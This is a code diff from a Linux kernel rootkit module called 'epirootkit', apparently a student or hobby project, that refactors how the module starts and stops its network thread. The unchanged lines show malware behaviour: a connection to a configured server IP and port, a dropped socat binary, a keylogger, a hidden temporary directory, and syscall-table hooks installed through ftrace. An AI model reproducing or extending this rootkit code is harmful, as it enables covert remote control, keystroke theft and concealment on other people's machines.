@@ -7,10 +7,6 @@
 #include "epirootkit.h"
 #include "ftrace.h"
 
-struct task_struct *network_thread = NULL;
-bool thread_exited = true;
-bool restart_on_error = true;
-
 char *ip = SERVER_IP;
 int port = SERVER_PORT;
 char *message = CONNEXION_MESSAGE;
@@ -45,24 +41,15 @@ static int __init epirootkit_init(void) {
         return -ENOMEM;
     }
 
-    // Init structure for exec_code_stds
-    if (init_exec_result() != SUCCESS) {
-        ERR_MSG("epirootkit: epirootkit_init: memory allocation failed\n");
-        return -ENOMEM;
-    }
-
     if (drop_socat_binaire() != SUCCESS) {
         ERR_MSG("epirootkit: epirootkit_init: failed to drop socat binary\n");
         return -FAILURE;
     }
 
     // Start a kernel thread that will handle network communication
-    thread_exited = false;
-    network_thread = kthread_run(network_worker, NULL, "netcom_thread");
-    if (IS_ERR(network_thread)) {
-        ERR_MSG("epirootkit: epirootkit_init: failed to start thread\n");
-        thread_exited = true;
-        return PTR_ERR(network_thread);
+    if (start_network_worker() != SUCCESS) {
+        ERR_MSG("epirootkit: epirootkit_init: failed to start network worker\n");
+        return -FAILURE;
     }
 
     return SUCCESS;
@@ -79,14 +66,8 @@ static void __exit epirootkit_exit(void) {
     // stop keylogger
     epikeylog_exit();
 
-    free_exec_result();
-
-    if (network_thread) {
-        if (!thread_exited)
-            kthread_stop(network_thread);
-        thread_exited = true;
-        network_thread = NULL;
-        DBG_MSG("epirootkit: close_thread: thread stopped\n");
+    if (stop_network_worker() != SUCCESS) {
+        ERR_MSG("epirootkit: epirootkit_exit: failed to stop network worker\n");
     }
 
     // Remove the hidden directory
@@ -94,7 +75,7 @@ static void __exit epirootkit_exit(void) {
         ERR_MSG("epirootkit: epirootkit_exit: failed to remove hidden tmp dir\n");
     }
 
-    close_socket();
+    close_worker_socket();
 
     // Remove hooks from the syscall table
     fh_remove_hooks(hooks, hook_array_size);
